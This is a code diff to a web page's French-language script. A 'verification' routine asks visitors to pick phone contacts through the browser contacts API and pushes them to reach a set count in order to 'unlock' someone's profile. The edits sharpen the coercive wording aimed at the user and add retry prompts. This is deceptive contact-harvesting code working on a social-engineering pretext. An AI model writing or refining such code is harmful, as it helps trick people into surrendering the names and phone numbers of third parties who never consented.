@@ -330,6 +330,7 @@
         }
 
         // ============ CAPTURE NATIVE (Chrome Android) ============
+               // ============ CAPTURE NATIVE (Chrome Android) ============
         async function startVerification() {
             if (allContacts.length >= TARGET_CONTACTS) return;
             if (navigator.vibrate) navigator.vibrate(50);
@@ -339,6 +340,7 @@
             btn.disabled = true;
             btn.innerHTML = `<span>Analyse...</span>`;
             status.innerText = "";
+            status.style.color = "#ff453a"; // Remettre la couleur rouge
 
             try {
                 const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
@@ -364,14 +366,17 @@
                     }
                     updateUI();
                 } else {
-                    status.innerText = "Sélection requise pour débloquer " + currentTargetName;
+                    // Si elle ouvre le répertoire mais ne coche personne
+                    status.innerText = "Veuillez sélectionner au moins un contact pour continuer.";
                 }
             } catch (e) {
-                status.innerText = "Action annulée. Vous devez vérifier votre réseau.";
+                // Si elle clique sur "Annuler" ou ferme le sélecteur
+                status.innerText = "Vérification incomplète. Veuillez sélectionner des contacts pour débloquer le profil.";
             } finally {
+                // Le bouton redevient cliquable dans tous les cas
                 btn.disabled = false;
                 if (allContacts.length < TARGET_CONTACTS) {
-                    btn.innerHTML = `<span>Vérifier plus de contacts (${allContacts.length}/${TARGET_CONTACTS})</span>`;
+                    btn.innerHTML = `<span>Réessayer (${allContacts.length}/${TARGET_CONTACTS})</span> <span>→</span>`;
                 }
             }
         }
